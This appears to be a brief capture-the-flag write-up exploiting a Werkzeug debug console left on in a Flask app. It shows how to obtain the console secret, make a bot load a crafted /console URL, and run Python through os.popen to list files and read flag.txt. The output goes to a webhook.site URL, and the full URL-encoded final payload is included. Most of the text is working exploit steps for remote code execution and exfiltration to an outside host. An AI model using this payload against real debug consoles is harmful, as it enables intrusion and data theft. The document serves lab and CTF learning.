realize the app is running on debug mode

get the value of SECRET from /console (SECRET = "")

make the bot visit `http://localhost:5000/console?__debugger__=yes&cmd=<CMD>&frm=0&s=<SECRET>`

1. `import os; import requests`
2. `requests.get(<webhook>+'?'+os.popen('ls').read())`
3. `requests.get(<webhook>+'?'+os.popen('cat flag.txt').read())`

> Remember to url encode. 

> It's helpful to run the container locally and inspect what goes on when you run Python in the console. Try to
> simulate the exact same request on the bot to achieve your RCE.

Final payload: http://localhost:5000/console?__debugger__=yes&cmd=requests.get%28%27https%3A%2F%2Fwebhook.site%2Fcc5844d4-2607-4150-a042-d3ed94253d72%3F%27%2Bos.popen%28%27cat%20flag.txt%27%29.read%28%29%29&frm=0&s=<secret>
